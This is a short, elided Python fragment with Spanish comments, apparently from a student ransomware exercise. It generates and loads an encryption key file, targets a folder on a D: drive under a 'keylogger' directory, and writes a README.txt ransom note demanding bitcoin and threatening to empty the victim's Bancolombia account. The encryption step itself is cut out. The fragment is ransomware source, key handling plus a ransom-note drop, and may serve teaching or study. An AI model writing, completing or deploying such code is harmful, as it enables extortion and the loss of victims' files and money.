...
def generar_key():
    ...
    with open('key_log.key', 'wb') as key_file:
         key_file.write(key)

# Cargar la llave generada
def cargar_key():
    return open('key_log.key', 'rb').read()
...
if __name__ == '__main__':
    path_to_encrypt = 'D:/HE8voS_EmersonRueda/keylogger/NoAbrir'
    ...
    with open(path_to_encrypt + '\\README.txt', 'w') as file:
        file.write('Pague bitcoin o le vaceo el Bancolombia')